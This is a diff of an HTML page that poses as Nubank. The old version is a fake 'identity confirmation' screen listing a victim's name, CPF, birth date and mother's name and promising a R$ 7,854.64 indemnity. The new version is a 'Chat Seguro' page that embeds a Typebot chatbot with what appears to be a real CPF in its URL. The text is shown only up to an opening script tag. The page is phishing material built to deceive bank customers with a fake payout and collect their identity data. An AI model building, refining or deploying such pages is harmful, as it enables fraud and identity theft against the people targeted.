@@ -3,120 +3,38 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Confirmação de Identidade - Nubank</title>
+  <title>Chat Seguro - Nubank</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #ffffff;
-      text-align: center;
-      padding: 30px;
+    html, body {
       margin: 0;
-    }
-
-    .container {
+      padding: 0;
+      height: 100%;
       width: 100%;
-      max-width: 90%;
-      margin: 0 auto;
-      border: 1px solid #ddd;
-      border-radius: 10px;
-      padding: 5vw;
-      box-sizing: border-box;
+      background: #ffffff;
     }
 
-    <div style="width: 100%; max-width: 100%; overflow: hidden;">
-  <iframe
-    src="https://typebot.io/xyz"
-    style="width: 100%; height: 90vh; border: none;"
-    allow="clipboard-write"
-  ></iframe>
-</div>
-
-
-    .logo {
-      margin-bottom: 10px;
+    .iframe-wrapper {
+      width: 100vw;
+      height: 100vh;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
     }
 
-    .divider {
-      border-top: 3px solid #8000ff;
-      margin: 20px 0;
-    }
-
-    .info-box {
-      background: #f3f3f3;
-      padding: 15px;
-      margin-bottom: 10px;
-      border-radius: 5px;
-      text-align: left;
-    }
-
-    .info-box b {
+    iframe {
+      border: none;
+      width: 100%;
+      height: 100%;
       display: block;
-      font-size: 0.9em;
-      color: #777;
-    }
-
-    .info-box span {
-      font-weight: bold;
-      font-size: 1.1em;
-    }
-
-    .footer {
-      font-size: 0.9em;
-      color: #666;
-      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-
-  <div class="container">
-    <img
-      class="logo"
-      src="https://i.postimg.cc/X7JSyHqM/Captura-de-tela-2025-05-30-234638.png"
-      alt="Nubank"
-      width="100"
-    />
-
-    <div class="divider"></div>
-
-    <div class="info-box">
-      <center>
-        Sua identidade foi confirmada com sucesso! <br />
-        Confira abaixo as informações cadastradas.<br />
-      </center>
-    </div>
-
-    <div class="info-box">
-      <b>Nome completo</b>
-      <span id="nome">...</span>
-    </div>
-
-    <div class="info-box">
-      <b>CPF</b>
-      <span id="cpf">...</span>
-    </div>
-
-    <div class="info-box">
-      <b>Data de Nascimento</b>
-      <span id="nascimento">...</span>
-    </div>
-
-    <div class="info-box">
-      <b>Nome da Mãe</b>
-      <span id="mae">...</span>
-    </div>
-
-    <div class="info-box">
-      <b>Indenização a receber</b>
-      <strong>R$ 7.854,64</strong>
-    </div>
-
-    <div class="divider"></div>
-
-    <div class="footer">
-      Sistema de Verificação - Nubank<br />
-      Santa Catarina
-    </div>
+  <div class="iframe-wrapper">
+    <iframe
+      src="https://typebot.io/SEU-BOT-AQUI?cpf=37364246800"
+      allow="clipboard-write"
+    ></iframe>
   </div>
 
   <script>
